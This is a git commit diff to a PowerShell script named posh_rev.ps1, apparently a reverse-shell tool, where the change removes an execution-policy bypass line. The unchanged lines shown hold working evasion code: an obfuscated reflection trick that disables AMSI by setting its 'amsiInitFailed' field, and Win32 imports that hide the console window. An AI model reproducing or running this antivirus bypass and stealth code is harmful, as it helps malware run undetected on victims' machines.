812cf47e92fc9fadbd6c4a3254f9369c20cce91d
in0d3 <114474229+in0d3@users.noreply.github.com>
2023-11-22 13:09:55 +0000

    Update posh_rev.ps1
    Removed execution policy bypass code

--- posh_rev.ps1
+++ posh_rev.ps1
@@ -6,8 +6,6 @@ $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
 sleep 5
 $field.SetValue($null,$true)
 
-set-ExecutionPolicy Bypass -Scope process
-
 Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 function Hide-Console
